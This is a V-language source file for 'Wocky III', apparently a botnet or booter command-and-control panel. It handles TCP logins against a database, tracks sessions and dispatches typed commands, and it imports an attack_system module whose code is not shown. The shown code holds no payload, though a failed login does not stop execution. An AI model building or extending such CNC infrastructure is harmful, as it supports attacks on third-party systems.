module wocky

import os
import io
import net
import time

import core
import auth
import crud
import config
import wocky
import utilities
import term_control
import attack_system
import wockyfx

import commands // List of Commands


pub fn connection_handler(mut socket net.TcpConn, mut w wocky.Wocky) { 
	mut reader := io.new_buffered_reader(reader: socket)
	mut ui_settings := core.Terminal{}
	mut buffer := core.Buffer{}
	user_addr := socket.peer_addr() or { return } // This should almost never return an err
	user_ip := "${user_addr}".replace("[::ffff:","").split("]:")[0]
	user_port := "${user_addr}".split("]:")[1]
	mut term_size := w.terminal.size.split(",")
	if term_size.len > 0 {
		term_control.change_size(term_size[0], term_size[1], mut socket)
	}

	mut username := ""
	mut password := ""
	if w.terminal.title != "" {
		term_control.change_title(w.terminal.title, mut socket)
	}

	if wockyfx.check_for_wfx_file("username_login") && wockyfx.check_for_wfx_file("username_login") {
		wockyfx.wockyfx(mut w.wx, "username_login")
		username = reader.read_line() or { "" }
		wockyfx.wockyfx(mut w.wx, "password_login")
		password = reader.read_line() or { "" }
	} else {
		socket.write_string("${config.Red}Username: ${config.Default}") or { 0 }
		username = reader.read_line() or { "" }
		socket.write_string("${config.Red}Password: ${config.Black}") or { 0 }
		password = reader.read_line() or { "" }
		socket.write_string("${config.Default}") or { 0 }
	}

	// Have to do a auth check here with the username and password later
	mut login_check, user_info := auth.login(username, password, user_ip, mut w.sqlconn)
	if login_check == 0 {
		socket.write_string("${config.Clear}${config.Red}[x] Error, No user found.....! exiting....") or { 0 }
		time.sleep(3*time.second)
		socket.close() or { return }
	} else if login_check == -1 {
		socket.write_string("${config.Clear}${config.Red}[x] Error, Invalid username or password.....! exiting....") or { 0 }
		time.sleep(3*time.second)
		socket.close() or { return }
	}

	socket.write_string(config.Clear) or { 0 }
	w.clients.add_session(username, mut socket, user_ip, user_port)
	if wockyfx.check_for_wfx_cmd("home") {
		wockyfx.wockyfx(mut w.wx, "home")
	} else {
		socket.write_string("Welcome to Wocky III\r\n") or { 0 }
	}
	println("${config.Green}[${utilities.current_time()}][+]${config.Default} User succesfully logged in. ${username} | ${user_ip}")
	println("${config.Green}[${utilities.current_time()}][+]${config.Default} Users Connected: ${w.clients.count}")

	command_handler(mut socket, mut &w, user_info)
}

pub fn command_handler(mut socket net.TcpConn, mut w wocky.Wocky, db_user_info map[string]string) {
	mut username, ip, port := w.clients.get_session_info(mut socket)
	mut buffer := core.Buffer{}
	mut reader := io.new_buffered_reader(reader: socket)
	// Grab all commands
	all_commands := wockyfx.get_all_cmds()
	mut input_cmd := ""
	for {
		// WockyFX Feature. Detecting a hostname file or use default hostname
		if wockyfx.check_for_wfx_file("hostname") && wockyfx.check_for_wfx_data("hostname") {
			wockyfx.wockyfx(mut w.wx, "hostname")
		} else {
			socket.write_string("[Wocky@NET]~ $ ") or { 
				w.clients.remove_session(mut socket)
				socket.close() or { return }
				return 
			}
		}
		// Grabbing input or disconnecting user!
		input_cmd = reader.read_line() or { 
			w.clients.remove_session(mut socket)
			socket.close() or { return }
			return
		}

		// Clear LAST Command Typed on Terminal
		cli_cord := w.terminal.cli_cursor.split(",")
		term_control.place_text_sock(cli_cord[0], cli_cord[1], utilities.create_empty_str(input_cmd.len), mut socket)

		// Command Handling
		if input_cmd.replace("\r\n", "").len > 2 {
			buffer.parse(input_cmd)

			// Loop throught commands
			mut cmd_found := false
			for i, cmd in all_commands {
				if buffer.cmd == cmd {
					cmd_found = true
					wockyfx.wockyfx(mut w.wx, buffer.cmd)
				}
			}

			if cmd_found == false {
				cord := w.terminal.cnc_output_position.split(",")
				term_control.place_text_sock(cord[0], cord[1], "[x] Invalid Command", mut socket)
			}
		}
	}

}